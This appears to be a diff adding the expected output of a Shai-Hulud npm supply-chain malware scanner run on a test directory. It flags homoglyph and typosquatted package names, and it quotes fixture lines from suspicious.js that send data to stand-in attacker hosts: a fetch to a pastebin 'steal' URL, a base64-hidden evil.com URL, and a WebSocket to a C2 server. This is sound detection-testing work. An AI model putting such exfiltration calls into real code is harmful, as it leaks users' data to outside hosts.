@@ -1,0 +1,57 @@
+📦 Loaded 604 compromised packages from /c/Users/gstra/Code/rust-scanner/shai-hulud-detect/compromised-packages.txt
+Starting Shai-Hulud detection scan...
+Scanning directory: /c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/comprehensive-test (with paranoid mode enabled)
+
+🔍 Checking for malicious workflow files...
+🔍 Checking 2 files for known malicious content...
+[K0 / 2 checked (0 %)[K🔍 Checking 1 package.json files for compromised packages...
+[K1 / 1 checked (100 %)[K🔍 Checking for suspicious postinstall hooks...
+🔍 Checking for suspicious content patterns...
+🔍 Checking for cryptocurrency theft patterns...
+🔍 Checking for Trufflehog activity and secret scanning...
+🔍 Checking for suspicious git branches...
+🔍 Checking for Shai-Hulud repositories and migration patterns...
+🔍 Checking package lock files for integrity issues...
+🔍+ Checking for typosquatting and homoglyph attacks...
+🔍+ Checking for network exfiltration patterns...
+
+==============================================
+  SHAI-HULUD + PARANOID SECURITY REPORT
+==============================================
+
+⚠️  MEDIUM RISK (PARANOID): Potential typosquatting/homoglyph attacks detected:
+   - Warning: Potential Unicode/homoglyph characters in package: reаct
+     Found in: /c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/comprehensive-test/package.json
+   - Warning: Potential typosquatting of 'lodash': lodsh (missing character)
+     Found in: /c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/comprehensive-test/package.json
+   NOTE: These packages may be impersonating legitimate packages.
+   Verify package names carefully and check if they should be legitimate packages.
+
+⚠️  MEDIUM RISK (PARANOID): Network exfiltration patterns detected:
+   - Warning: Hardcoded IP addresses found: 10.0.1.50
+     Found in: /c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/comprehensive-test/suspicious.js
+   - Warning: Suspicious domain found: pastebin.com: fetch("https://pastebin.com/steal", {
+     Found in: /c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/comprehensive-test/suspicious.js
+   - Warning: Base64 decoding at line: const hiddenUrl = atob("aHR0cHM6Ly9ldmlsLmNvbS9zdGVhbA==");
+     Found in: /c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/comprehensive-test/suspicious.js
+   - Warning: WebSocket connection to external endpoint: wss://c2-server.evil.com/data
+     Found in: /c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/comprehensive-test/suspicious.js
+   - Warning: Suspicious base64 encoding near network operation
+     Found in: /c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/comprehensive-test/suspicious.js
+   NOTE: These patterns may indicate data exfiltration or communication with C2 servers.
+   Review network connections and data flows carefully.
+
+==============================================
+🔍 SUMMARY:
+   High Risk Issues: 0
+   Medium Risk Issues: 7
+   Total Critical Issues: 7
+
+⚠️  IMPORTANT:
+   - High risk issues likely indicate actual compromise
+   - Medium risk issues require manual investigation
+   - Low risk issues are likely false positives from legitimate code
+   - Issues marked (PARANOID) are general security checks, not Shai-Hulud specific
+   - Consider running additional security scans
+   - Review your npm audit logs and package history
+==============================================
